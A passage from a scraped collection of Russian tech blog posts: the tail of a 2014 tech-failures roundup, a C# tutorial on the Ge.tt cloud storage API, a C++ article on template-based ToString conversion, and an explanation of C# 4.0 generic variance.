сделанных с помощью Snapchat, что ж, у вас есть все шансы увидеть ваши сообщения где-нибудь в Сети. Представители Snapchat почему-то отказались выражать сочувствие пострадавшим: мол, вините самих себя, коль пользуетесь сомнительными сервисами.\n\n4. Apple: небольшая трещинка в идеальном образе\n\n\r\nЭто был еще один рекордный год для Apple, которая продолжает наслаждаться господством iPhone на рынке смартфонов. Но даже в «яблочном царстве» оказалось не все так идеально.\n\r\nЕсли говорить о проблемах, связанных с безопасностью, то тут и не нужно ничего вспоминать: шумиха, поднятая вокруг украденной «звездной» фотообнаженки — среди прочих досталось актрисе Дженнифер Лоуренс и топ-модели Кейт Аптон — до сих пор не дает заснуть кое-кому в Apple. Ведь фотографии утекли с личных аккаунтов в iCloud. Впрочем, менеджеры компании «ушли в несознанку», отвергая любые сомнения в надежности архитектуры системы безопасности. Тим Кук закрыл тему, заявив, что «меры приняты». \n\r\nА потом был апгрейд iOS 8.0.1 для iPhone и iPad. Изначально предназначенное для исправления ошибок в iOS 8 обновление «порадовало» пользователей неожиданными сюрпризами вроде надписи «Нет сети» и отключением дактилоскопического сенсора TouchID. Надо отдать должное Apple — обновление обновления под номером 8.0.2 вышло весьма оперативно. А затем появилась и iOS 8.1, которая вернула папку «Фотопленка».\n\r\nСреди прочих попыток очернить светлый образ — публичная ссора Apple и производящей искусственные сапфиры GT Advanced, которая обвинила в своем банкротстве негуманные методы работы «яблочников» с поставщиками, негативная реакция пользователей на усиленное продвижение нового альбома U2 и раздутый скандал с гнущимимся смартфонами.\n\n3. Сатья Наделла учится не говорить то, что не стоит говорить\n\n\r\nНовый генеральный директор Microsoft (на фото вверху), в целом, взял хороший старт — компания бодро движется в направлении новой стратегии развития и даже у планшетов Surface врое бы как появилось второе дыхание.\n\r\nОднако некоторые шаги Наделлы можно расценивать как довольно сомнительные — речь идет о выступлении CEO Microsoft, в котором он посоветовал женщинам не просить прибавки к зарплате, а просто верить в то, что система сама позаботится о них: «Дело не в повышении, а в знании и вере, что система сама воздаст вам должное за приложенные усилия», — сказал Наделла.\n\r\nВпрочем, самое худшее в этой истории было то, что генеральный директор заявил это на женской технической конференции имени Грейс Хоппер «Женщины и ИТ».\n\r\nНаделла, правда, вскоре «изменил курс», сказав, что нечетко сформулировал свой комментарий. Днем позже он признал, что был неправ.\n\r\nЭто не остановило волну критики и ему пришлось практически весь октябрь держать оборону, защищая свои взгляды на женщины и технологии. Совет женщинам, работающим в Microsoft: просите прибавки — босс внимательно слушает.\n\n2. Первый смартфон Amazon: а был ли мальчик?\n\n\r\nПомните Fire Phone? Не переживайте, если нет. Вы не одиноки.\n\r\nПервый «амазоновский» смартфон был весьма ожидаемым девайсом. Компания смогла договориться c AT&T о партнерстве, что обещало хороший старт на рынке. У него были две уникальные фишки — четыре специальных фронтальных камеры, отслеживающих движения, и создающие «динамическую перспективу» и встроенные возможности сканирования штрих-кодов и других данных, связанных с реальными объектами, что упрощало их поиск и покупку на Amazon.com.\n\r\nНо как и Facebook в свое время, Amazon не приняла во внимание тот факт, что наклейка на корпусе смартфона с именем известного бренда еще не гарантирует успех. На Fire Phone была предустановлена модифицированная версия Android, которая не поддерживала ключевые приложения Google, такие как Google Maps или Gmail. Эффект от маркетинговой поддержки AT&T быстро прошел и уже спустя два месяца стоимость телефона упала до 99 центов (включая обязательный контракт).\n\r\nУникальные возможности? Похоже пользователям их не заметили.\n\r\nПо мнению старшего вице-президента Amazon Дэвида Лимпа компания ошиблась с ценообразованием. Если планшеты Kindle Fire легко конкурировали в своем сегменте, то начальный ценник на Fire Phone, мягко говоря, удивлял ($200). Что ж, может Amazon больше повезет со следующей версией смартфона.\n\n1. RadiumOne. Вот как бывает!\n\n\r\nЗнакомьтесь, Гурбакш Чахал, гендир RadiumOne, победитель в категории «Эпик Фэйл 2014»!\n\r\nМалоизвестный стартап попал на первые полосы газет и журналов в худшем смысле этого выражения, когда Чахал был арестован и обвинен в нанесении побоев и домашнем насилии после того как в течение получаса он нанес свой подружке 117 ударов. Поначалу в своей твит-ленте он писал о собственной невиновности и обвинял прессу в предвзятости. Правда затем «невиновный» удалил все свои твиты.\n\r\nВ том, что Чахал должен уйти с поста генерального директора ни у кого не было сомнений. Однако не обошлось без хлопка дверью. В своем письме, адресованном к совету директоров, Чахал сообщил, что он «глубоко разочарован» решением его членов и решение о его, Чахала, увольнении — большая ошибка.\n\r\nВы думаете, что проблемы RadiumOne на этом закончились? Как бы не так: в мае выяснилось, что одного из сотрудников компании за подделку документов разыскивала Секретная служба США.\n\r\nБилл Лонерган, новый генеральный директор RadiumOne, полон оптимизма — по его словам все проблемы компании удалось уладить к июню. Он также добавил, что компания не потеряла ни одного из своих основных клиентов и второй квартал был лучшим периодом в истории компании.\n\r\nОК, все хорошо, что хорошо кончается.\n\nP.S. Если этот материал расстроил вас, спешим напомнить, что будущее — в наших руках!\r\nP.P.S. Если вы согласны с Пунктом 13 этой статьи, то попробуйте выиграть новехонький Xbox One (обязательное условие: наличие эрудиции). Впрочем, если вы не согласны с Пунктом 13, то почему бы все равно не попробовать?", {"day": "1", "month": "декабря", "time": "16:29"}, {"rate": 2, "views": 5900}], ["Недавно мне пришлось работать над интересным проектом, в котором заказчик просил реализовать обмен файлами через интернет, соответственно с прямым доступом прямо из приложения.\n\r\nОсновные требования:\n\nОтображение списка файлов.\nЗагрузка и скачивание через интерфейс программы.\nСкрытая авторизация без участия пользователя.\n\r\nПервое что пришло на ум — использовать облачное хранилище данных с доступом по API. Итак, что из этого вышло? \n\nПервые проблемы\r\nЯ решил изучить API документацию таких сервисов как:\n\nDropBox\nBox.com\nWindows Live SkyDrive\nGe.tt\n\r\nСначала меня устраивали все хранилища. В каждом существовали методы загрузки, прямого скачивания, удаления, вывода списка файлов, а так же сниппеты и даже библиотеки взаимодействия API для NET. платформы. Вроде бы все что нужно! Но появились некоторые критические для меня моменты, например DropBox устанавливал ограничение на количество запросов к API — 5000 в день. И самая главная проблема хранилищ(в моей ситуации): DropBox, Box, Windows Live SkyDrive в способе авторизации клиентских приложений — OAuth. Такой вид авторизации не позволяет напрямую передать данные для входа в учетную запись. Остался только один претендент Ge.tt.\n\nФайлы для всех\r\nGe.tt предоставляет пользователю бесплатное хранилище объемом 2Гб. Для взаимодействия с облаком, необходимо создать приложение и получить APIKey. Документация довольно скудная, но все необходимые функции есть. Условия использования полностью соответствуют требованиям заказчика. Модель авторизации простая: POST запрос с параметрами Email + Password + APIToken. Бонус к этому, готовая динамическая библиотека с реализацией необходимых функций, с ней мы и будем работать.\n\nРеализация\r\nСтруктура хранилища определяется следующим образом: \n\nShares (Шары) — отдельные элементы (папки) содержащие структуры.\nFiles (Файлы) — непосредственно структура с файлами.\n\n\r\nТо есть каждая шара может включать в себя список файлов, таким образом можно создавать тематические разделы, соответствующие, например расширению файла.\r\nОпишем основной алгоритм:\n\nАвторизация.\nОбновление шар.\nПолучение списка файлов в шарах.\nЗагрузка файла.\n\n\nАвторизация\r\nПодключаем библиотеку к нашему проекту:\nusing Gett;\n // Логинимся \nGett.Sharing.GettUser user = new Gett.Sharing.GettUser(20);//Максимальное число одновременных подключений. По умолчанию 2\n            user.Login(\"qbxpm1maish5tgwjivqnl0a88jv2t9tim\", \"example@mail.com\", \"dj47vn3oc7\");\n\r\nДля безопасности не рекомендую хранить логин и пароль в чистом виде, используйте шифрование.\n\nПолучаем файлы\r\nКак я уже писал, чтобы получить список файлов необходимо выбрать определенную шару. Сделаем вывод списка шар в listBoxShare, тогда при клике по элементу будем подгружать список файлов в listBoxFiles:\n\nuser.RefreshMe();//POST запрос\n            this.listBox_Share.Items.Clear(); \n            this.listBox_Files.Items.Clear();\n this.listBox_Share.Items.AddRange(user.Shares.GetShares()); //Добавление диапазона шар в listBox\n// Gett.Sharing.GettShare[]  _shares = user.Shares.GetShares(); //Пример добавление шар в массив, если необходимо\n\r\nПолучение информации о файлах аналогичный процесс. В событии SelectedIndexChanged у listBox_Share пишем код:\n\n private void listBoxShare_SelectedIndexChanged(object sender, EventArgs e)\n        {\n            this.listBox_Files.Items.Clear();\n            if (this.listBox_Share.SelectedItem is Gett.Sharing.GettShare)// проверка типа данных\n            {\n                Gett.Sharing.GettShare share = (Gett.Sharing.GettShare)this.listBox_Share.SelectedItem;//присвоение переменной выделенного элемента\n                this.listBox_Files.Items.AddRange(share.Files);// добавление диапазона данных о файлах в listBox_Files\n    List<Gett.Sharing.GettFile> FileList = new List<Gett.Sharing.GettFile>();// пример создания массива  с информацией о файлах\n                \n            }\n        }\n\r\nСледует помнить, что мы получаем список файлов, который содержит:\n\nКоличество загрузок.\nПорядковый номер.\nПолное имя.\nURL.\nРазмер.\nДата загрузки.\n\n\r\nЧтобы получить необходимые свойства нужно обратиться к нужному элементу, и вызвать свойство Info:\n\n\n string name= FileList[0].Info.FileName;//имя файла в нулевом индексе массива\n                long size = FileList[0].Info.Size;//размер файла\n\n\r\nТеперь скачаем файл. Пишем код, напимер для того же SelectedIndexChanged:\n\n\n if (this.listBox_Files.SelectedItem is Gett.Sharing.GettFile)// проверка типа данных\n            {\n                Gett.Sharing.GettFile file = (Gett.Sharing.GettFile)this.listBox_Files.SelectedItem;//получение экземпляра файла\n\n                SaveFileDialog saveDialog = new SaveFileDialog();//инициализируем saveDialog для сохранения файла\n                saveDialog.OverwritePrompt = true;\n                saveDialog.FileName = file.Info.FileName;\n\n                if (saveDialog.ShowDialog() == DialogResult.OK)\n                {\n                  \n                    file.DownloadFileAsync(saveDialog.FileName);// ассинхронная загрузка\n                   \n                }\n\n\r\nДальше дело вашей фантазии: удаляйте, переименовывайте файлы, создавайте каталоги. API открывает широкие возможности для реализации любых идей. Хорошая идея залог успеха!", {"day": "9", "month": "апреля", "time": "18:04"}, {"rate": 18, "views": 1300}], ["Для вывода в лог (да и не только для этого, но это то, с чем я сам столкнулся) нужно конвертировать значение переменной в строку.\n\r\nВ C++ это обычно делается выводом в поток (как вариант — использование boost: lexical_cast<> — что в нашем случае практически одно и тоже).\n\r\nДля встроенных типов это не проблема, а вот как быть, если нужно вывести скажем std: vector? Увы, но у std: vector нет оператора вывода в поток.\n\r\nВ результате решения этой проблемы написал код, которым хочу поделиться с сообществом.\n\n\nОсновная идея.\r\nИтак, сначала основная идея. Идея, собственно, весьма проста — написать набор перегруженных функций, которые будут выполнять преобразование в строку.\n\r\nПервый вопрос, который перед нами встает — это какой прототип функции использовать: \n\ntemplate<typename T>\nvoid ToStream(std::wostream& strm, const T& val);\n\r\n или\n\ntemplate<typename T>\r\nstd::wstring ToString(const T& val);\n\r\nВторой вариант кажется более привлекательным — передаем переменную — возвращает строку.\r\nНо с точки зрения производительности (нам ведь нужна производительность — иначе зачем мы полезли в C++) первый вариант обычно выигрывает, так как не создается временная переменная (типа std: wstring) для возвращаемого значения.\r\nК тому-же простая обертка без проблем дает нам и второй вариант: \n\ntemplate<typename T>\r\nstd::wstring ToString(const T& val)\n{\r\n    std::wostringstream strm;\r\n    ToStream(strm, val);\n\r\n    return strm.str();\n}\n\r\nПервая проблема решена, теперь переходим собственно к реализации ToStream (). Самый простой вариант это вывод через оператор вывода (простите за тавтологию).\n\ntemplate <typename T>\nvoid ToStream(std::wostream& strm, const T& val)\n{\r\n    strm << val;\n}\n\r\nСтоп! А что если у типа нет оператора вывода? Наткнулись на первоначальную проблему. Решение очевидно — нужно разрешить эту функцию только для типов, для которых оператор вывода в поток определен. В коде это выглядит так: \n\n// Любой тип T может быть неявно приведен к данному типу\n// Используется в нижеследующей функции\nstruct AnyType\n{\r\n    template <class T>\r\n    AnyType(T)\r\n    {\r\n    }\n};\n\n// Оператор вывода\n// Используется для детектирования типов, которые не имееют оператора вывода (operator<<)\ntemplate <class Char>\r\nboost::type_traits::no_type operator<<(std::basic_ostream<Char>&, AnyType);\n\n// Можно ли вывести тип T в поток (есть ли у типа T operator<<)?\ntemplate <class T, class Char>\nclass IsOutStreamable\n{\r\n    static std::basic_ostream<Char>& GetStrm();\r\n    static const T& GetT();\r\n    static boost::type_traits::no_type Impl(boost::type_traits::no_type);\r\n    static boost::type_traits::yes_type Impl(...);\npublic:\r\n    static const bool value = sizeof(Impl(GetStrm() << GetT())) == sizeof(boost::type_traits::yes_type);\n};\n\n// === Используя оператор вывода для типа T\ntemplate <typename T>\ntypename boost::enable_if_c<IsOutStreamable<T, wchar_t>::value, void>::type\r\nToStream(std::wostream& strm, const T& val)\n{\r\n    strm << val;\n}\n\r\nОтлично, первый этап пройден.\r\nЧто дальше? Определим вывод для типа std: pair — будем выводить в виде \"(T, U)“: \n\n// === std::pair\ntemplate<typename T, typename U>\nvoid ToStream(std::wostream& strm, const std::pair<T, U>& val)\n{\r\n    strm << L'(';\r\n    ToStream(strm, val.first);\r\n    strm << L\", \";\r\n    ToStream(strm, val.second);\r\n    strm << L')';\n}\n\r\nКто-то задал вопрос? Повторите пожалуйста — на расстоянии 10 000 километров плохо слышно…\r\nЗачем мы [рекурсивно] вызываем ToStream ()? Все очень просто. Дело в том, что типы T и/или U в свою очередь могут быть сложными типами, например std: pair<int, std::pair<int, int> >. В случае рекурсивного вызова получим вывод в виде (0, (1, 2)), что нам собственно и надо.\n\r\nНаступил звездный час и для стандартных контейнеров (выводим в виде \"[3](1, 2, 3)»): \n\n// Определяем has_iterator и т.д.\r\nBOOST_MPL_HAS_XXX_TRAIT_DEF(iterator);\r\nBOOST_MPL_HAS_XXX_TRAIT_DEF(const_iterator);\r\nBOOST_MPL_HAS_XXX_TRAIT_DEF(value_type);\n\n// Структура для теста \"является ли тип стандартным контейнером (STL container)\"\n// Считаем, что тип это контейнер, если он содержит определение типов\n// для iterator, const_iterator и value_type, но не является std::[w]string\ntemplate<typename T>\nstruct IsStdContainer\n{\r\n    static const int value = boost::mpl::and_<\r\n        has_iterator<T>,\r\n        has_const_iterator<T>,\r\n        has_value_type<T>,\r\n        boost::mpl::not_<boost::is_same<T, std::string> >,\r\n        boost::mpl::not_<boost::is_same<T, std::wstring> >\r\n    >::value;\n};\n\n// === STL контейнеры (и то, что выглядит как STL контейнеры - см. IsStdContainer выше)\ntemplate<typename T>\ntypename boost::enable_if<IsStdContainer<T>, void>::type\r\nToStream(std::wostream& strm, const T& val)\n{\r\n    strm << L'[' << val.size() << L\"](\";\n\r\n    if ( !val.empty() )\r\n    {\r\n        typename T::const_iterator it = val.begin();\r\n        ToStream(strm, *it++);\r\n        for (; it != val.end(); ++it)\r\n        {\r\n            strm << L\", \";\r\n            ToStream(strm, *it);\r\n        }\r\n    }\n\r\n    strm << L')';\n}\n\r\nТеперь определим преобразование для типа bool. К счастью это проще, чем предыдущие функции. Только одно маленькое замечание — в моем коде в хидере (.h) только описание функции, а определение вынесено в .cpp файл. Причина проста — если хидер включается в несколько .cpp файлов, то функция определяется в нескольких единицах трансляции, что есть плохо и линковшик нам об этом сообщит (злорадствуя по поводу своего превосходства). Для шаблонных функций этого не происходит. Исключительно для простоты я перенес определение функции в хидер (что не следует делать для рабочих проектов по причине, описаной выше).\n\n// === bool\nvoid ToStream(std::wostream& strm, const bool& val)\n{\r\n    strm << ( val ? L\"true\" : L\"false\" );\n}\n\r\nВот, в кратце, и все основные функции. Правда в моей реализации есть еще: \n\n// === std::string\nvoid ToStream(std::wostream& strm, const std::string& val);\n\n// === char*\nvoid ToStream(std::wostream& strm, char* val);\n\n// === const char*\nvoid ToStream(std::wostream& strm, const char* val);\n\n// === const char\nvoid ToStream(std::wostream& strm, const char val);\n\r\nДля чего? Для вывода в «широкий» поток (std: wostream) «узких» строк/символов (char, std: string). Дело в том, что в своих проектах я имею дело со строками в формате UTF8. Соответственно храню я такие строки в std: string. В функциях ToStream (std: wostream& strm, const std: string& val) я преобразую строку из UFT8 в std: wstring и вывожу ее. Код функций не привожу, так как его усложнит, а ничего принципиального нового не принесет.\n\r\nТеперь примеры использования.\r\nДля начала пара вспомогательных макросов (не надо кидать в меня камнями! Иногда макросы могут сильно облегчить жизнь).\r\nПервый макрос: \n\n#define _VAR(var) L ## #var << L\"<\" << ToString(var) << L\"> \"\n\r\nпозволяет нам написать код: \n\nint i = 0;\nint n = 10;\r\nstd::cout << _VAR(i) << _VAR(n);\n\r\nи получить в выводе: \n\ni<0> n<10>\n\r\nпочему не «i=0 n=10»? Причина ощущается при выводе строк: \n\nstd::string s1 = \"\";\r\nstd::string s2 = \" \";\r\nstd::cout << _VAR(s1) << _VAR(s2);\n\r\nвывод (если подсветка кода не даст сбой, то разница будет очевидна): \n\ns1<> s2< >\n\r\nВторой макрос для тестов — если условие не выполняется, то кидает исключение: \n\n#define CHECK(expr)     \\\r\n    if ( !( expr ) )    \\\r\n    {                   \\\r\n        throw #expr;    \\\r\n    }                   \\\r\n    else                \\\r\n        ((void)0)\n\r\nТеперь собственно примеры: \nПример 1. Вывод std: vector.\r\nНаиболее простой из примеров.\n\nstd::vector<int> v = boost::assign::list_of(0)(1)(2)(3);\r\nCHECK(ToString(v) == L\"[4](0, 1, 2, 3)\");\r\nstd::wcout << _VAR(v) << std::endl;\n\nПример 2. Вывод std: map.\r\nЭтом пример немного интересней тем, что в нем используется 2 функции — для контейнера и для std: pair (напоминаю, что map хранит в себе пары) — вот для чего мы писали вывод пар.\n\nstd::map<int, int> m = boost::assign::map_list_of(0, 1)(2, 3)(4, 5);\r\nCHECK(ToString(m) == L\"[3]((0, 1), (2, 3), (4, 5))\");\r\nstd::wcout << _VAR(m) << std::endl;\n\n<h4>Пример 3. Снова вывод std::map.</h4>\r\nЭтом пример еще интересней. В в качестве значений используется векторы.\n\n<code class=\"cpp\">\r\n    std::map<std::wstring,  std::vector<int> > msv = boost::assign::list_of< std::pair<std::wstring, std::vector<int> > >\r\n        (    L\"zero\",    boost::assign::list_of(0)        )\r\n        (    L\"one\",        boost::assign::list_of(1)(2)    )\r\n        (    L\"two\",        boost::assign::list_of(2)(3)(4)    )\r\n    ;\n\r\n    CHECK(ToString(msv) == L\"[3]((one, [2](1, 2)), (two, [3](2, 3, 4)), (zero, [1](0)))\");\r\n    std::wcout << _VAR(msv) << std::endl;\n\r\nНадеюсь, что никого не удивляет, что вывод отличается от того, что написано в инициализации. Если кого-то это все-таки удивляет, то советую вспомнить что такое std: map и как там хранятся данные.\n\nПример 4. Вывод пользовательских типов.\r\nСначала код.\n\nenum RO4_ReplyType                                         /// Reply type\r\n    {\r\n        RO4_RT_Mobile,                                        ///< Replies go to mobile phone\r\n        RO4_RT_Email,                                        ///< Replies go to email address\r\n        RO4_RT_MobileAndEmail                                ///< Replies go to mobile phone and to email address\r\n    };\n\r\n    RO4_ReplyType rt = RO4_RT_Email;\r\n    CHECK(RO4::Manip::ToString(rt) == L\"1\");\n\r\nСобстенно ничего интересного — enum приводится к целому типу и выводится его значение. Я бы не стал приводить этот банальный пример, если бы не возможность расширения моего решения. Добавляем следующий код (опять макрос! да, я в курсе, но мне так проще): \n\n/// Output operator for RO4_ReplyType\nvoid ToStream(std::wostream& strm, const RO4_ReplyType& val)\n{\n#define STR(name)    case name: strm << L## #name; break\r\n    switch ( val )\r\n    {\r\n        STR(RO4_RT_Mobile);\r\n        STR(RO4_RT_Email);\r\n        STR(RO4_RT_MobileAndEmail);\n\r\n    default:\r\n        strm << L\"Unknown value of RO4_ReplyType<\" << static_cast<int>(val) << L\">\";\r\n    }\n#undef STR\n}\n\r\nи о чудо! Вывод превращается в: \n\nRO4_ReplyType rt = RO4_RT_Email;\r\nCHECK(RO4::Manip::ToString(rt) == L\"RO4_RT_Email\");\n\r\nТ.е. в этом примере показано как расширить возможности применения моего решения.\n\nПослесловие.\r\nPS: В реальной реализации все обернуто в пространства имен. Полные листинги (с более приятной подсветкой синтаксиса) здесь: \n\nRO4_ToString.h\nmain.cpp", {"day": "25", "month": "января", "time": "02:33"}, {"rate": 27, "views": 16000}], ["Вариантность всегда была для меня слишком сложной темой, чтобы разобраться в ней. Недавно я делал доклад о новых особенностях C# 4.0 и вариантность была одной из охваченных мной тем. Я хотел бы начать с распространенного сценария, который мне всегда было трудно понять. Возьмем вот такой фрагмент кода:\n\n\nIList<object> stuff = new List<string>();\n* This source code was highlighted with Source Code Highlighter.\r\nЭто не будет компилироваться ни в одной из существующих версий .NET Framework. Я всегда пытался понять, почему бы этому не работать. Тип System.String, безусловно, удовлетворяет все требования System.Object. Так почему же это не работает? Обобщение List – это ссылочный тип, что означает что каждый раз когда кто-то сошлется на объект этого типа в коде, он получит указатель на некоторое место в куче. И неважно сколько раз вы используете List, вы всегда получаете ту же самую ссылку т.к. это ссылочный тип. Так вот, давайте разовьем наш предыдущий пример:\n\n\nIList<object> stuff = new List<string>();\nstuff.Add(\"Joe is awesome\");\nstuff.Add(9);\nstuff.Add(false);\n* This source code was highlighted with Source Code Highlighter.\n\r\nВот тут и есть проблема! Переменная stuff – это IList<object>. Значит, мы можем добавить в нее любой объект, в том числе int или bool. Но обернитесь на то, что мы только что устроили – .NET Framework хранит ссылку на основное объявление типа, т.е. фактически на List<string>. Мы не можем добавить в список этого типа int или bool, поскольку это не строковые типы. Это кое-что проясняет из того, что меня интересовало так долго. Давайте исследуем теперь такой код:\n\n\nIEnumerable<object> stuff = new List<string>();\n* This source code was highlighted with Source Code Highlighter.\n\r\nВ настоящее время, как выяснено ранее, .NET не позволяет нам такое делать. Подождите, вы считаете, что этот код должен работать? Да, я вынужден согласиться. Такой код должен работать, потому что IEnumerable – это особый тип. Дело в том, что этот тип не принимает модификаций. Единственное, за что IEnumerable отвечает, так это за возврат объектов, т.е. он возвращает объекты (objects coming out). Это сеет некоторые сомнения касательно наших прежних выводов. Вот у нас есть абсолютно корректный сценарий, когда вы должны иметь возможность выполнить присваивание потому что мы не будем делать никаких внутренних модификаций и можем, следовательно, избежать любых таких проблем с типизацией, обнаруженных в предыдущем примере.\r\nЗдесь, IEnumerable<string> определенно может выполнить роль IEnumerable<object>, потому что string наследник от object, а значит object — более общий тип. Иначе говоря, тип string ковариантен типу object. Единственная проблема – .NET 3.5 и более ранние версии не имеют способа для разрешения этой ситуации. Переключимся на .NET 4.0. Вот несколько определений интерфейсов:\n\n \npublic interface IEnumerable<out T> : IEnumerable\n{\n  IEnumerator<T> GetEnumerator();\n}\n \npublic interface IEnumerator<out T> : IEnumerator\n{\n  bool MoveNext();\n  T Current { get; }\n}\n* This source code was highlighted with Source Code Highlighter.\n\r\nНовое ключевое слово, которое вы видите, “out”, определяет что мы только разрешаем T быть возвращенным из нашего интерфейса. Это разрешит наши предыдущие попытки присвоить IEnumerable<string> к IEnumerable<object> потому что мы просто говорим компилятору, что T никогда не будет передан в наш интерфейс.\n\r\nКонечно, есть и обратный сценарий, когда тип только передается в ваш интерфейс. Это лучше продемонстрировать посмотрев на следующий класс:\n\n\nclass Program\n{\n  void Manipulate(object obj)\n  {  \n  }\n  void ContravariantGoodness()\n  {\n    Action<object> manipulateObject = Manipulate;\n    Action<string> manipulateString = Manipulate;\n    manipulateString = manipulateObject;\n  }\n}\n* This source code was highlighted with Source Code Highlighter.\n\r\nЕдинственное, что вам здесь не видно, это то, что тип Action в C# 4.0 содержит ключевое слово “in” для обобщенного параметра. Как указано ранее, это не будет работать в .NET 3.5 или более ранних версиях. В этом примере тип object контрвариантен типу string потому что object относится к string как более общий класс к более конкретному. Поскольку в этом случае переменная передается как object, мы можем в самом деле передать все что угодно (почти) в .NET, что удовлетворяет этому контракту, включая тип string. Весьма классная примочка.\r\nНужно помнить главное, что это все основано на ссылочных типах. Нечто типа такого никогда не будет работать в любом из сценариев:\n\n\npublic struct Parent<T>\n{\n  public T GetT()\n  {  \n    ...\n  }\n}\n* This source code was highlighted with Source Code Highlighter.\n\r\nЯ очень раз видеть это в .NET 4.0 и я лично считаю, что это лучшее из добавленных новых функций. Теперь идите и проверьте это.", {"day": "21", "month": "августа", "time": "03:52"}, {"rate": 15, "views": 447}]], "refs_quant": 135}